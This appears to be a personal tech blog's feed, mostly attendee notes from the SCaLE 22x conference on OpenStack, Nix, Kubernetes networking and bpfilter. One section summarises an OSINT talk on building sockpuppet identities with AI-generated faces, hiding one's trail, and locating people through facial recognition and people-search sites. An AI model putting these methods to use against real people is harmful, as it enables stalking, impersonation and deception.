<li>One team was watching a fortnite stream (though this was an image from a previous year). Everybody goes “haha funny fortnite” but in all seriousness, watching twitch streams acts as an external source of motivation for me while I work on longer projects. I watch either people new to horror games, or software/cybersec stuff, because I enjoy seeing people suffer.</li>
</ul></li>
<li>Get the model of Coastline’s college presentation windows machine — I love it’s form factor, it’s quite small. I forgot. <code>:(</code>. Oh well.</li>
<li>I should write my lowercase l in such a way where it’s clear what they are</li>
<li>More pencils. I should also bring my own notebook.</li>
<li>Cutleries? It would be nice if we had a knife for the cream cheese so we could put it on the bagels.</li>
<li>Scissors and printer paper (I want to do origami)</li>
<li>Amazon makes customm hoodies. They aren’t good, apparently, but you can just submit an image to go on a hoodie.</li>
<li>Keep my hands/self warm. The room was cold and I typed slower than usual until my hands warmed up.</li>
</ul>
</section>
<section id="notes-misc" class="level2">
<h2 class="anchored" data-anchor-id="notes-misc">Notes Misc</h2>
<ul>
<li>The HP Elitedesk 800 G1 and G6 don’t seem to have the small form factor I expected <code>:(</code> (They were the desktops in the classified area of the competition)</li>
<li>Datto brand device, running Debian 12 was a “magic box” used for Black Team. But I really liked the form factor of that device, it was quite small, like a NUC.</li>
<li>Apparently, Insurance companies find red teamers highly valuable, since they can assess risk in companies that they insure for cyber attacks.</li>
<li>“Red team forces leadership to respond”</li>
<li>Not wearing identifying clothing is apparently a strategy by some teams.</li>
</ul>
<p>Sean/Tirefire:</p>
<ul>
<li>College is also about what you <em>don’t like</em> as well as what you like</li>
<li>Weekly assignments assigned on saturday, and then done and discussed during the week</li>
<li>Team leader who managed rather than operating directly, they wouldn’t have their hands on a keyboard.</li>
<li>Inject person who is timekeeper and bugging people to do things</li>
<li>Team composition: 2 networking 2 linux 2 windows, all problem solvers. Figure it out if you don’t know. Not necessary specialize, but at least cross train.</li>
<li>Argued that we should have just taken a laptop to low side
<ul>
<li>We could have just connected it to low side wifi.</li>
</ul></li>
<li>https://fogproject.org — disk cloning project, pretty cool</li>
<li>Potential strat: Turn off service, harden some, turn it off again to prevent SLA checks.</li>
<li>Qualifiers env is replicated into regionals regularly. “You’ll see regionals again, like in invitationals”.</li>
<li>“We don’t affect Nationals at all”.</li>
<li>Cameron wanted to record. “Just do it anyways, see what happens.”. Forgiveness, rather than permission.</li>
<li>Put CCDC on your resume. It shows skills of teamwork, handling pressure, and learning new things.</li>
<li>Presentation is a skill in it of itself</li>
<li>Understanding security tradeoffs, compromises. Sometimes a sacrifice needs to be made.</li>
</ul>
</section>
<section id="personalleadership-notes" class="level2">
<h2 class="anchored" data-anchor-id="personalleadership-notes">Personal/Leadership Notes</h2>
<ul>
<li>Encourage hypothesis/testing in a learning environment, rather than giving answers
<ul>
<li>Watched a Black Teamer do it excellently</li>
</ul></li>
</ul>


</section>
</section>

 ]]></description>
  <category>writeups</category>
  <guid>./writeups/wrccdc/</guid>
  <pubDate>Fri, 28 Mar 2025 07:00:00 GMT</pubDate>
</item>
<item>
  <title>SCaLE 22x: All 4 days</title>
  <link>./blog/scale-22/</link>
  <description><![CDATA[ 




<section id="scale-22" class="level1">
<h1>Scale 22</h1>
<p>This is my second time going to the <a href="https://socallinuxexpo.org/">so cal linux expo</a>, AKA SCaLE. It’s very exciting, and this time I will take notes of the things I see.</p>
<p>The big things I am excited for is:</p>
<ul>
<li>Nix (PlanetNix)</li>
<li>Kubernetes (Cloud Native Days and DevopsDaysLA)
<ul>
<li>There used to be Kubecon but not this year, instead it’s Cloud Native Days.</li>
</ul></li>
<li>Openstack (Openinfra days is here, they weren’t here last time)</li>
<li>Friends! (I met many people from LA and near Pasadena, and I am excited to see them here as well)</li>
</ul>
</section>
<section id="openinfra-days" class="level1">
<h1>OpenInfra Days</h1>
<p>I went to the first meeting, and was immediately introduced to an interesting software — <a href="https://docs.rackspacecloud.com/genestack-components/">genestack</a>. Unlike openstack helm, it doesn’t seem to <em>require</em> rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn’t like being deployed on a single node.</p>
<section id="kubernetes-as-a-geographically-distributed-system" class="level2">
<h2 class="anchored" data-anchor-id="kubernetes-as-a-geographically-distributed-system">Kubernetes as a Geographically Distributed System</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system</a></p>
<p>This presentation is about StarlingX, which is noted below. It’s a very interesting piece of software.</p>
<p>StarlingX:</p>
<ul>
<li>Started 7 years ago</li>
<li>Built for “edge computing”</li>
<li>All of the system services and components are deployed in containers</li>
<li>Sees heavy use in the telecommunications sectors</li>
</ul>
<p>More discussion of Kata-Containers, it seems that they use it for security at the edge. It can also be used for multi-tenancy.</p>
<p>Deployment models:</p>
<ul>
<li>One/two server models</li>
<li>Ceph for storage, can use ceph on one node deployments
<ul>
<li>Can use external ceph for larger deployments</li>
</ul></li>
<li>Control, storage, and worker nodes</li>
<li>AIO (all in one) simplex:
<ul>
<li>No high availability or redundancy</li>
</ul></li>
<li>AIO Duplex: Two nodes, so if one fails the setup stays up</li>
<li>Standard: Two controller nodes (with storage) and then a worker/compute node</li>
<li>Some nodes can be used as storage nodes regardless</li>
</ul>
<p>Distributed Cloud:</p>
<ul>
<li>INtroduced in 3.0</li>
<li>Hetegenerous kubernetes/openstack environment</li>
<li>Central cloud, a controller cloud
<ul>
<li>Horizon dashboard, docker registry, keystone</li>
</ul></li>
<li>Remote, geographically dispered edge clouds
<ul>
<li>They are semi-autonomous, meaning they work without network</li>
</ul></li>
<li>Distributed control plane</li>
</ul>
<p>Resiliencey/Geo redundancy</p>
<ul>
<li>If a natural disaster/etc happens, the system doesn’t go down</li>
<li>If one cluster goes down, the system stays up</li>
</ul>
<p>Management:</p>
<ul>
<li>Tools to configure pxeboot, lifecycle, health and sensors</li>
<li>Monitoring of stuff</li>
<li>BMC/IPMI management things</li>
<li>Service management, configures high availability profiles</li>
<li>Auto update software, and/or add more functionality
<ul>
<li>Rolling updates</li>
</ul></li>
</ul>
<p>StarlingX is used heavily in the Telecom segments:</p>
<ul>
<li>They require 5 9’s of uptime. They require less than 5 minutes of downtime for a whole <strong>YEAR</strong> of uptime.</li>
</ul>
<p>New things in 10.0:</p>
<ul>
<li>Ipv4/v6 dual stack</li>
<li>Kata containers support</li>
<li>Managing up to 5,000 sites per system controler</li>
<li>Unified software management</li>
<li>Switch between standard and/or low latency kernel at runtime
<ul>
<li>Low latency sounds cool but has higher resource usage and resource needs. Presenter suggests sticking with standards unless you require specific things.</li>
</ul></li>
</ul>
<p>Telecom deployment things:</p>
<ul>
<li>StarlingX is used in 5G deployments?!
<ul>
<li>“Highly Utilized”</li>
<li>Small footprint.</li>
</ul></li>
<li>Precision time protocol</li>
</ul>
<p>Smallest deployment needs 1 cpu core.</p>
<p><a href="https://starlingx.io/blog" class="uri">https://starlingx.io/blog</a></p>
<p>Interesting software/product list:</p>
<ul>
<li><a href="https://github.com/rackerlabs/genestack">Genestack</a> — Openstack on/alongside K8s.</li>
<li><a href="https://www.zconverter.com/">Zconverter</a> ­— Migrations of Vmware to Openstack</li>
<li><a href="https://github.com/kata-containers/kata-containers/">Kata-containers</a> — Container runtime that uses a virtual machine for more security/isolation
<ul>
<li>Similar project mentioned: Confidential containers</li>
</ul></li>
<li><a href="https://www.starlingx.io/">StarlingX</a>
<ul>
<li>Linux, Debian, Kubernetes, Openstack (on kubernetes), seems to be a Linux distro, they offer an ISO.</li>
<li>“Enhanced Networking” — ipv6, dual stack support, now available</li>
</ul></li>
<li><a href="https://github.com/platform9/vjailbreak">vJailbreak</a> — automatic migrations from vmware to openstack.
<ul>
<li>Doesn’t appear to be live, minimal downtime</li>
</ul></li>
<li>Free educational/research clouds:
<ul>
<li><a href="https://cloudlab.us" class="uri">https://cloudlab.us</a>, <a href="https://chameleoncloud.readthedocs.io/en/latest/contents.html" class="uri">https://chameleoncloud.readthedocs.io/en/latest/contents.html</a>, Jetstream2</li>
</ul></li>
</ul>
</section>
</section>
<section id="planetnix" class="level1">
<h1>PlanetNix</h1>
<p>According to the Flox intro presenter, there is a blog about getting Nix to run on Windows.</p>
<section id="tvix-replit" class="level2">
<h2 class="anchored" data-anchor-id="tvix-replit">Tvix / Replit</h2>
<p>Replit used to use nix, and then they switched to the tvix implementation of the nix daemon. Unlike Nix, it uses a content addressable store, leading to massive storage savings when deduplication. They compressed their database from 6 terabytes to 1.2 terabytes. Incremental updates don’t take as much space, and it’s much cehaper overall.</p>
<p><img src="./blog/scale-22/images/tvix_savings.jpg" class="img-fluid"></p>
</section>
<section id="eelco-dostras-configurable-flakes" class="level2">
<h2 class="anchored" data-anchor-id="eelco-dostras-configurable-flakes">Eelco Dostra’s Configurable flakes:</h2>
<p><a href="https://determinate.systems/posts/flake-schemas/" class="uri">https://determinate.systems/posts/flake-schemas/</a></p>
<p>Flakes don’t support passing of command line arguments, Eelco has a solution. This solution maintains benefits of nix, like hermeticity, caching, and discoverability.</p>
<p>Interesting software/product list:</p>
<ul>
<li><a href="https://flox.dev/">Flox</a> — Flox uses nix packages, but aims to be a more user friendly abstraction layer</li>
<li><a href="https://github.com/TraceMachina/nativelink/tree/main/local-remote-execution">NativeLink/local-remote-execution</a>
<ul>
<li>Somewhere in here is code that converts a nix shell/env from a flake to a docker container</li>
</ul></li>
<li>Tvix, an alternate implementation of the nix store</li>
<li><a href="https://github.com/krei-systems/vix" class="uri">https://github.com/krei-systems/vix</a> a wrapper for the Nix command line interface</li>
</ul>
</section>
</section>
<section id="embedded-programming-workshop" class="level1">
<h1>Embedded Programming Workshop</h1>
<p>I saw an embedded programming workshop, running during lunch when the Openstack stuff and Nix stuff was put on holds.</p>
<p>Firstly, I got a free board! One of <a href="https://www.amazon.com/STM32-Nucleo-Development-STM32F446RE-NUCLEO-F446RE/dp/B01I8XLEM8">these</a>. It doesn’t run an operating system, so the presenter referred to it as “bare metal C”</p>
<p>Tools needed: <code>gcc stlink stlink-gui stlink-tool stm32loader stm32flash</code> * Eclipse, C extension, STM extension which can be found <a href="https://www.openstm32.org">here</a></p>
<p>Setup: Chown the /dev/ttyACM0 to be owned by your user.</p>
<p>Compilation: <code>gcc something</code></p>
<p>Misc Notes</p>
<ul>
<li>Text files are different between all three operating systems because Microsoft, Linux, and Apple decided to store the end of line/newline character as either a carriage return, line feed, or both. This was due to an earlier device which needed to use both a carriage return and a line feed in order to avoid physical issues with ink smudging.</li>
<li>uart library is used for C programming with embedded devices.</li>
<li>Polling is needed since device can be sent to the serial faster than it can be worked with
<ul>
<li>Polling is a simple algorithm: Ask if device is ready, then send character (or do the thing)</li>
<li>Mostly a waste of time, but is very simple</li>
</ul></li>
<li>Interrupt: Alternative, more efficient than polling
<ul>
<li>a signal that “interrupts” the</li>
<li>Device raises interrupt line, CPU halts normal flow and calls interrupt function, which is an actual function</li>
<li>ARM devices save state of machine before interrupt function, which means you don’t have to do it manually</li>
<li>USART2_IRQHandler: interrupt function</li>
</ul></li>
</ul>
<p>I had to leave early, but the author of this talk, Steve Oualline, seems very interesting. He has a <a href="https://nostarch.com/bare-metal-c">book published by no starch press</a>, Bare Metal C, which is about embedded C programming.</p>
<p>He also has some <a href="http://www.oualline.com/books.free/free-books.html">free books</a> and other resources on his website.</p>
<p>Here’s the device I received, the STM32:</p>
<p><img src="./blog/scale-22/images/stm32.jpg" class="img-fluid"></p>
</section>
<section id="sunseccon" class="level1">
<h1>SunSecCon</h1>
<section id="osint-for-cybersecurity-and-hackers" class="level2">
<h2 class="anchored" data-anchor-id="osint-for-cybersecurity-and-hackers">OSINT for Cybersecurity and Hackers</h2>
<p>This is another presentation, done by [REDACTED], and ███ █████████. Given the topic at hand, and the way that [REDACTED] mentioned trying to scrub her name from the internet, I thought it would be appropriate to redact the presenters’ names. They are easy to find though, consider it an introduction into the world of OSINT.</p>
<p>Both presenters are red team, [REDACTED] is the “people side” and ███ is the “tech side”. [REDACTED] views it as not just a set of steps, but a thought process.</p>
<p>Search Engines:</p>
<ul>
<li>Different search engines give different results (what’s dogpile?)</li>
<li>Different browsers give different results</li>
<li>Different… internet connections?</li>
<li>Search engines can index content that is supposed to be walled and even make it accessible’</li>
<li>Search yourself! Forwards, backwards, etc.</li>
<li>4 or 5 different ways to write phone numbers. International means even more methods. Search every kind in order to get lucky.</li>
<li>Email addresses. What if targets use the same username across email addresses and platforms</li>
<li>Usernames: Divide up, mix around</li>
<li>Dates: Can also be written in a million different ways</li>
<li>United States is the only country to put the month first (lmao)</li>
</ul>
<p>Sockpuppets:</p>
<ul>
<li>Called “identities” in the investigation world
<ul>
<li>datafakegenerator.com, fake name generator, platforms to help creation of sockpuppet accounts</li>
</ul></li>
<li>Select mildly popular real name.
<ul>
<li>███: Select names that were popular for a generation and manipulate your accounts to look older/younger</li>
</ul></li>
<li>Sometimes government agency members aren’t permitted to create a sockpuppet account with a real person’s name. A way around this is via other usernames.</li>
<li>Do not use a real person’s image, it’s tracable, especially if the image is from a public source
<ul>
<li><a href="https://ThisPersonDoesNotExist.com" class="uri">https://ThisPersonDoesNotExist.com</a>, <a href="https://Generated.Photos/Human-Generator" class="uri">https://Generated.Photos/Human-Generator</a>, SnapChat, ChatGPT/AI image generators. <a href="https://huggingface.co/black-forest-labs" class="uri">https://huggingface.co/black-forest-labs</a> (flux I think?). Other Stable Diffusion, Hugging Face models.</li>
<li><a href="https://www.synthesia.io/tools/talking-head-video-maker" class="uri">https://www.synthesia.io/tools/talking-head-video-maker</a> — Generates talking vidoes of your head or another person’s head.</li>
<li>Burner app. Other deepfakes</li>
<li>Same the screenshot to a thumbdrive, named as something simple, to ensure no computer metadata is traced</li>
</ul></li>
</ul>
<p>Staying Private/Anonymous:</p>
<ul>
<li>Virtual machines
<ul>
<li>███: Build a virtual machine dedicated to a specific task. Change the background to something with a ton of identifying info, so you know who “this person” is.</li>
<li>███: Make a virtual machine to play with AI. GPT4ALL. Airgapped AI can be used in locked down environments.</li>
<li>███: I have a VM just for taxes.</li>
</ul></li>
<li>Private Browser: Private browser doesn’t cache anything. Not always malicious stuff, sometimes it’s just porn lmao.</li>
<li><a href="https://tails.net/">Tails</a>! Made by Tor, portable, amnesiac operating system that keeps the user anonymous. Can be put on a thumbdrive.</li>
<li>VPN, needed on every device.
<ul>
<li>[REDACTED] uses HidemyAss, because of 270 given locations. Lets her pretend to be from other locations. Also lets her get into geolocked/blocked resources.</li>
<li>███ has a similar usecase, pretend to be from a usecase while searching for companies and organizations.</li>
</ul></li>
<li>Virtual credit cards: Privacy.com</li>
<li>Phone numbers
<ul>
<li>Gmail: Free google voice, which can be used to get burner numbers.</li>
<li>“Burner App” — turns your phone into a burner phone</li>
<li>Iphones have an update where you can record calls — but only legal in one party states.</li>
<li><a href="https://callhippo.com/international-phone-number/" class="uri">https://callhippo.com/international-phone-number/</a> — International VOIP phone number</li>
<li>“Call Voice Changer — IntCall” — Voice Changer, [REDACTED] needed one to sound like a man.</li>
</ul></li>
</ul>
<p>Security Advice:</p>
<ul>
<li>“Don’t click” ­— Open a browser and log into the account instead.</li>
</ul>
<p>Finding People:</p>
<ul>
<li>Facial Recognition
<ul>
<li><a href="https://pimeyes.com" class="uri">https://pimeyes.com</a> — 30 USD / Month</li>
<li>Facecheck.ID — This one will find images that match but are blurry. Only accepts payment via crypto.</li>
<li>Yandex, Russian Search engine, does an excellent job of object recognition</li>
</ul></li>
<li>Phone numbers
<ul>
<li><a href="https://spydialer.com" class="uri">https://spydialer.com</a> : US based site that lets you call someone’s number, but it will show someone else’s number, and it will get the voicemail message.</li>
</ul></li>
<li>User info lookup
<ul>
<li><a href="https://www.melissa.com/" class="uri">https://www.melissa.com/</a> — Site designed to clean personal data… but can also be used to find personal information.
<ul>
<li>Cheaper to search in the first month of usage. Gives many credits for free as a sign up bonus.</li>
<li>Global Lookups are very useful.</li>
</ul></li>
<li><a href="https://FastPeopleSearch.com" class="uri">https://FastPeopleSearch.com</a> — [REDACTED]’s favorite one. Free.</li>
<li><a href="https://TruePeopleSearch.com" class="uri">https://TruePeopleSearch.com</a> — Similar to above, perhaps owned by the same company. [REDACTED] says it didn’t give her as much.</li>
</ul></li>
<li>Google Earth:
<ul>
<li>███ likes Google Earth. Story: Hiker gets lost, and then he sends images of where he is. Then some guy who has mastered the art of figuring out where movies are shot, and then uses Google Earth to figure out exactly where the hiker got lost.</li>
</ul></li>
<li>Tweetdeck
<ul>
<li>Now requires X (formerly known as twitter) pro, can search a ton of old tweets.</li>
<li>Let’s you follow someone without following them. Sometimes younger people think that @ ’ing people is private.</li>
<li>Can “archive” deleted tweets.</li>
<li>Can do advanced search, filter by location, use booleans, etc. Can also search by emoji.</li>
</ul></li>
<li>Google alerts:
<ul>
<li>Weekly report of new stuff that would come up in a google alert</li>
</ul></li>
</ul>
<p>Finding Devices:</p>
<ul>
<li><a href="https://shodan.io" class="uri">https://shodan.io</a> — Search engine for the entire internet
<ul>
<li>I prefer <a href="https://www.zoomeye.ai/">zoomeye</a> because they give more free stuff.</li>
</ul></li>
<li>Nmap, OpenVAS, etc.</li>
</ul>
<p>Dark Web Indexes/Search Engines:</p>
<ul>
<li>Dark Blue Intelligence — Dark web scraper that you can search
<ul>
<li>Can get a demo as long as you’re with a company</li>
</ul></li>
<li>Dark Owl, less user friendly than above though</li>
<li><a href="https://www.skopenow.com/" class="uri">https://www.skopenow.com/</a>
<ul>
<li>Scrapes <em>everything</em>, including the dark web.</li>
<li>Will give a 7 day trial if you tell them you were in [REDACTED]’s OSINT training.</li>
</ul></li>
</ul>
<p>AI:</p>
<ul>
<li>“Write this better”</li>
<li>AI hallucinates, so [REDACTED] must verify that it’s output is accurate.</li>
<li>Deepfakes are concerning. There was a zoom call, with 6 “people” who where deepfakes and scammers managed to get half a million dollars from a Hong Kong company.</li>
</ul>
</section>
</section>
<section id="cloud-native-con" class="level1">
<h1>Cloud Native Con</h1>
<section id="kubernetes-and-the-dragons-in-linux-kernel-vs.-userspace-tools" class="level2">
<h2 class="anchored" data-anchor-id="kubernetes-and-the-dragons-in-linux-kernel-vs.-userspace-tools">Kubernetes and the Dragons in Linux Kernel vs.&nbsp;Userspace Tools</h2>
<p>“Computers, operating systems, networks are a hot mess. They’re barely manageable, even if you know a decent amount about what you’re doing. Nine out of ten software engineers agree: it’s a miracle anything works at all.”</p>
<p><a href="https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride" class="uri">https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride</a></p>
<p>Kernel abstractions:</p>
<ul>
<li>Kernel abstracts hardware</li>
<li>Netfilter which has iptables or nftables on it</li>
<li>Kernel has modules, that can be compiled into or not out of the kernel</li>
</ul>
<p>Userspace tooling configures kernel level things:</p>
<ul>
<li>Iptables tool command line tool can configure nftables or iptables which configure netfilter</li>
<li>Sometimes this causes issues</li>
</ul>
<p>Kubernetes system components must cross the background into kernelspace:</p>
<ul>
<li>CNI’s may need to manage iptables rules</li>
<li>GPUs, CSIs, Meshes</li>
</ul>
<p>Iptables</p>
<ul>
<li>Used by many kubernetes components: kuber-proxy, CNI’s, NPC’s</li>
<li>Pre-container era tool, designed so that there is only one iptables setup on the system</li>
<li>The command line tool can configure the legacy iptables, or nftables</li>
<li>Every component must use either iptables or nftables, otherwise networking will break.
<ul>
<li>K8s community has <a href="https://github.com/kubernetes-sigs/iptables-wrappers">wrappers</a> that detect the mode. Not bulletproof, though, but usually works</li>
</ul></li>
</ul>
<p>Iptables Rules</p>
<ul>
<li>Read ALL rules, do changes, and then write them back</li>
<li>No pratcile way to manage individual rules</li>
</ul>
<p>Iptables versions</p>
<ul>
<li>Rules are stored and executed on kernel level</li>
<li>But the host and containers can have different versions</li>
<li>Different versions can interpret the rules differently</li>
<li>v1.8.7 seems to lack the marking feature, meaning it could bug iptables by a later version into dropping ALL packets rather than just marked ones
<ul>
<li>Presenter had so much <em>fun</em> debugging that one</li>
</ul></li>
</ul>
<p>“I have not seen any attempts at keepign the <em>in kernel</em> ruleset compatible to older versions of iptables-nft” — Phil Sutter (kernel netfilter dev).</p>
<ul>
<li>Basically they don’t treat the above issue as a bug. Lmao.</li>
<li>Presenter defends this, arguing that it makes sense because it’s a pre-container tool, and is not designed to handle multiple instances of it running on your system</li>
</ul>
<p>Iptables must be the same version everywhere:</p>
<ul>
<li>Hosts, kube-proxy, CNI, mesh
<ul>
<li>So this must be why using a firewall with kubernetes is not recommended. It’s unlike a stable release distro will have a firewall that uses the same version of iptables</li>
</ul></li>
<li>Can you really pin all the versions?</li>
<li>k0s began to pin, and vendor iptables into the k0s binary itself.
<ul>
<li>Cannot override host operating system, but they try</li>
</ul></li>
</ul>
<p>Moving away from iptables:</p>
<ul>
<li>Legacy iptables is getting less popular, because of read-all, write all setup
<ul>
<li>Still default in some spots, like kube-proxy</li>
</ul></li>
<li>Nftables and eBPF on the rise
<ul>
<li>Nftables lets you modify a single rule alone</li>
</ul></li>
</ul>
<p>Ipset:</p>
<ul>
<li>Efficient management of sets of addresses</li>
<li>Quick lookups for iptables rules</li>
<li>Stored “in kernel” as hashes, bitmaps, etc</li>
<li><em>Also</em> a pre-containers era tool</li>
</ul>
<p>Ipsets can be managed by multiple components (again):</p>
<ul>
<li>6.2 kernel added a new “bitmask” parameter, which older ipset versions cannot cope with</li>
<li>Now the ipset version matters, but also the kernel version</li>
<li>Version must be pinned across networking pieces: kube-proxy, CNI’s, mesh, NCP, etc
<ul>
<li>k0s can pin all the kubernetes images. But it cannot pin the host.</li>
</ul></li>
<li>Mismatch can cause via OS packages or kernel version updating</li>
</ul>
<p>Modprobe:</p>
<ul>
<li>Userspace tool to load/unload kernel modules</li>
<li>Handles depenencies</li>
<li>Pre containers era tool</li>
</ul>
<p>Kernel modules:</p>
<ul>
<li>Compiled as a “.ko”, kernel object</li>
<li>Distributed as compressed, and modprobe decompresses when unloading
<ul>
<li>Can be compressed via multiple algorithms</li>
<li>The modprobe in a container might not always support the compression algo used on the host. Debian 12 kmod supports ZSTD and XZ, but what if host uses GZ, and the container is Debian 12? Then kernel module loading in the container will fail</li>
</ul></li>
<li>CNIs, CSIs, etc, <em>might</em> need to load modules, so they mount /lib, /sys, etc
<ul>
<li>CNI might need contracts, CSI might need filesystem, GPU stuff, etc</li>
<li>Usually not relevant though</li>
</ul></li>
<li>Audience member: “Are there CNI’s which load modules? Sounds scary?”</li>
</ul>
<p>Debugging:</p>
<ul>
<li>Iptables case caused ALL networking to go down — no ssh access to machine</li>
<li>Very unfamilier errors</li>
<li>Super low level stuff</li>
</ul>
<p>How presenter debugged:</p>
<ul>
<li>They ran k0s in containers, since all their testing was based on this</li>
<li>Read kernel code… a lot of it.</li>
<li>They could docker exec, even if the networking goes down</li>
<li>Trial and error to discover issue</li>
</ul>
<p>Fixes:</p>
<ul>
<li>No easy fix</li>
<li>k0s pins versions of kubernetes components</li>
<li>Test EVERYTHING before rolling out to prod</li>
</ul>
</section>
</section>
<section id="devopsdayla" class="level1">
<h1>DevopsDayLA</h1>
<p>So apparently, DevopsDay LA has a regular meetup, every two months, on Thursday in Santa Monica.</p>
<p><img src="./blog/scale-22/images/thankyoudevopsers.jpg" class="img-fluid"></p>
<p>This is funny, but it should be noted that DevOps as a career has many remote jobs, which is what this may be referencing.</p>
<p>Interesting software/products:</p>
<ul>
<li><a href="https://runme.dev" class="uri">https://runme.dev</a> — Interactive markdown notebooks for devops</li>
</ul>
</section>
<section id="scale-presentations" class="level1">
<h1>Scale Presentations</h1>
<section id="a-simpler-and-faster-firewall-with-bpfilter" class="level2">
<h2 class="anchored" data-anchor-id="a-simpler-and-faster-firewall-with-bpfilter">A simpler and faster firewall with bpfilter</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter</a></p>
<p><a href="https://naccy.de/2024/10/01/bpfilter-status-report.html" class="uri">https://naccy.de/2024/10/01/bpfilter-status-report.html</a> — blog post by the presenter from last eyar</p>
<p>Linux Firewalls:</p>
<ul>
<li>Iptables: Rules are shaped as C structures
<ul>
<li>See my notes on the problems with iptables from the other talk “Kubernetes and the Dragons in Linux Kernel vs.&nbsp;Userspace Tools”</li>
<li>Not very performant, after 512 rules, performance goes down immensely</li>
</ul></li>
<li>Nftables: Performance drops off after 128 rules, before iptables does</li>
<li>BPF: Much more performant, can also do things like calling a program along with the packet.
<ul>
<li>You must write C code, that works for a specific version of an unstable API</li>
<li>Faster than iptables or nftables</li>
</ul></li>
<li>BPFilter firewall
<ul>
<li>performance drops off at 1024</li>
</ul></li>
</ul>
<p>You can make the firewalls faster using “sets”</p>
<ul>
<li>No performance dropoff after a certain amount of rulesets</li>
<li>Works on nftables and bpfilter</li>
</ul>
<p>Audience member: Have you done a comparison between bpfilter and “nftables offload” where it runs on the NIC itself? But bpfilter seems to also be able to offload.</p>
<p>3 main components:</p>
<ul>
<li>bfcli, libbpfilter, bpfilter</li>
<li>Much more usable cli</li>
</ul>
<p>Chain architecture:</p>
<ul>
<li>Chain is similar to a chain in iptables or a table in nftables</li>
<li>In the chain there are rules, and the rules have an action</li>
<li>Can decide to do normal firewall things, like drop packets</li>
</ul>
<p>Bytecode Factory:</p>
<ul>
<li>Bpfilter creates BPF programs</li>
<li>Similar to event driven programming</li>
<li>Runtime context of the program disappears when it returns, so you have to make “maps to save data”</li>
<li>All the bytecode runs in the kernelspace</li>
<li>BPF verifier will check that BPF code is valid</li>
</ul>
<p>Demo:</p>
<ul>
<li>He runs iptables-legacy and then adjusts some rules</li>
<li>Then uses bpfilter to change some rules and drop some backets</li>
<li>The bpfilters daemon can be “closed”, and then it will stop accepting connections. However, the program is still running.</li>
<li>He shows the bpfilter config setup. It’s… okay. But it’s simialr in complexity (and power), as iptables. For usage by a homelabber or other inexperienced user it would need to be abstracted by another layer like how firewalld and ufw abstract ip/nftables.</li>
<li>Bpfilter also have sets, he shows us a set of ip’s in the config file</li>
</ul>
<p><a href="https://bpfilter.io" class="uri">https://bpfilter.io</a></p>
<p>BPFilter roadmap: <a href="https://github.com/orgs/facebook/projects/50" class="uri">https://github.com/orgs/facebook/projects/50</a></p>
<p>RPM package available in fedora. But the presenter reccommends building it yourself.</p>
<p>Questions (more like answers):</p>
<ul>
<li>I am not satisfied with the answer to my question: What if there are multiple bpclients on the system configuring a single bpfilter daemon
<ul>
<li>But it seems to be better architectured and dodges some of the issues</li>
</ul></li>
<li>It can be used alongside nftables for features that it lacks</li>
</ul>
</section>
<section id="affording-your-ai-chatbot-friends" class="level2">
<h2 class="anchored" data-anchor-id="affording-your-ai-chatbot-friends">Affording your AI chatbot friends</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends</a></p>
<p>What if your boss insists that you need AI?</p>
<ul>
<li>But what does AI mean?</li>
<li>What even are you supposed to deploy?</li>
<li>Buy or build? Moving parts? What infra? What is an “AI agent”? Is this expensive?…</li>
</ul>
<p>AI agent:</p>
<ul>
<li>Model that has access to tools, e.g escalating tickets, running sql queries, or</li>
<li>Think square peg, round hole?</li>
</ul>
<p>Moving parts of AI:</p>
<ul>
<li>Models: Big balls of floating point numbers that take input, turn tokens into embeddedings, do CUDA magic, and then spit out more tokens
<ul>
<li>Try llama models to start. Deepseek, or OpenAI</li>
</ul></li>
<li>Inference engine: Thing that runs the models
<ul>
<li>llama.cpp, or the python things</li>
<li>This is the part that needs the GPU to run, the pricy part</li>
</ul></li>
<li>Your code:
<ul>
<li>Sits in the middle, wraps</li>
<li>Most diverse and opinionated</li>
</ul></li>
<li>UI
<ul>
<li>sparkly part</li>
</ul></li>
</ul>
<p>“Excessive acronym compliance” lmao</p>
<p>Model provider methods:</p>
<ul>
<li>Relying on OpenAI means you rely on them to keep your business afloat.
<ul>
<li>Most providers sell at a loss to get adoption</li>
<li>They have replaced snapshots off models with differenent models. Xe had an issue where a new snapshot of chatgpt turned their chatbot fro happy to depressed <code>:(</code>.</li>
<li>Deprecations become emergency.</li>
</ul></li>
<li>Self hosting
<ul>
<li>Big models are truly massive. “Big data is bigger than most people’s laptop ram”.</li>
<li>You own the stack, and can choose models or the deprecation schedule.</li>
<li>A lot more freedom and control</li>
<li>No data is sent to third parties. “This can be very important in acronym compliance”.</li>
</ul></li>
</ul>
<p>Downsides to self hosting:</p>
<ul>
<li>Nvidia drivers… <code>:(</code>. “They will never fall over work hours”.
<ul>
<li>Can be worked around with reduancy, but there are tradeoffs.</li>
</ul></li>
<li>You have to choose the models. Choice paralysis.</li>
<li>Must be opinionated about ollama vs llama.cpp or the other options.
<ul>
<li>Must do research and develop opinions, which costs time.</li>
</ul></li>
<li>You need GPU’s by Nvidia.
<ul>
<li>“I can’t stop you from hurting yourself” — when referring to AMD or apple silicon options</li>
<li>Nvidia GPU’s are the easiest, but extremely pricy, and also have a big wait time.</li>
<li>Service life of one to three years.</li>
</ul></li>
</ul>
<p>Middle path, Nomadic Compute:</p>
<ul>
<li>“Nomadic Compute” — new buzzword by Xe Iaso</li>
<li>Cheating by your setup hunting down the best deal from providers.</li>
<li>All cloud providers have GPU’s. Xe said they saw small clouds on lowendbox advertising GPU setups.</li>
<li>GPU’s you only need model year, video memory, and memory bandwidth. Nothing else matters.</li>
<li>Older cards can be used for AI workflows, but the price per hour goes down.</li>
</ul>
<p>Skypilot:</p>
<ul>
<li>Abstraction layer for infrastructure as a service</li>
<li>Give it a bunch of API keys</li>
<li>It will figure out the best deal and then switch</li>
<li>It will also autoscale up and down</li>
</ul>
